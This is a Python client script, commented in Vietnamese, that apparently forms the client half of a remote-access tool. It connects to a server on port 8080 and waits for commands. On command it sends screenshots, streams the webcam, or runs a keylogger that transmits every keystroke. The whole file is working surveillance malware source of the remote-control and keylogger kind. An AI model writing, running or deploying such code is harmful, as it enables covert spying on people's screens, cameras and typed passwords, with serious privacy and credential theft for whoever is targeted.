import socket
import cv2
import struct
import mss
import numpy as np
from pynput import keyboard

def get_local_ip():
    # Tạo một socket kết nối theo giao thức UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Không cần kết nối thật, chỉ cần trỏ tới một IP bất kỳ (ví dụ IP này không tồn tại)
        # Hệ điều hành sẽ tự động xác định IP nội bộ (LAN) tốt nhất để đi ra ngoài
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1' # Fallback về localhost nếu không có mạng
    finally:
        s.close()
    return IP

def stream_webcam(client_socket):
    print('Bắt đầu stream webcam...')
    cap = cv2.VideoCapture(0)

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
        data = buffer.tobytes()

        message_size = struct.pack("L", len(data))
        try:
            client_socket.sendall(message_size + data)
        except Exception as e:
            print("Mất kết nối stream:", e)
            break
    cap.release()


# --- HÀM CHỤP MÀN HÌNH MỚI THÊM VÀO ---
def take_screenshot(client_socket):
    print('Đang tiến hành chụp màn hình...')
    with mss.mss() as sct:
        # Chụp màn hình chính (Monitor 1)
        monitor = sct.monitors[1]
        screen_img = np.array(sct.grab(monitor))

        # Chuyển đổi hệ màu từ BGRA sang BGR
        frame = cv2.cvtColor(screen_img, cv2.COLOR_BGRA2BGR)

        # Nén ảnh thành JPEG chất lượng cao (85) để nhìn rõ chữ
        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        data = buffer.tobytes()

        # Đóng gói kích thước ảnh (4 bytes Header) và gửi sang Server
        message_size = struct.pack("L", len(data))
        try:
            client_socket.sendall(message_size + data)
            print('Đã gửi ảnh chụp màn hình thành công!')
        except Exception as e:
            print("Lỗi gửi ảnh chụp màn hình:", e)

def send_data(client_socket,message):
    try:
        # Code strings into bytes before sending over the network
        client_socket.sendall(f"{message}".encode('utf-8'))
    except Exception as e:
        print(f"\n[-] Error sending data: {e}")
        return False

def on_press(client_socket, key):
    try:
        send_data(client_socket, key.char)
    except AttributeError:
        # FIXED: If Esc is pressed, notify the server and stop the listener safely
        if key == keyboard.Key.esc:
            send_data(client_socket, "[ESC_STOP]")
            listener.stop()
        send_data(client_socket, f" [{key.name}] ")

# --- PHẦN LUỒNG CHÍNH CỦA CLIENT ---
CLIENT_IP = get_local_ip()
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((CLIENT_IP, 8080))  # Hãy đổi IP này thành IP máy server của bạn

client.send(b'Hello from client!')
message = client.recv(1024).decode()
print(message)

cmd = client.recv(1024).decode('utf-8')

while cmd != 'exit':
    if cmd == 'screenshot':
        # Gọi hàm chụp màn hình khi nhận lệnh từ server
        take_screenshot(client)
    elif cmd == 'stream':
        stream_webcam(client)
    elif cmd == 'keylogger':
        print("Monitoring keyboard and transmitting data... Press 'Esc' to exit.")
        with keyboard.Listener(on_press=lambda key: on_press(client, key)) as listener:
            listener.join()
    cmd = client.recv(1024).decode('utf-8')
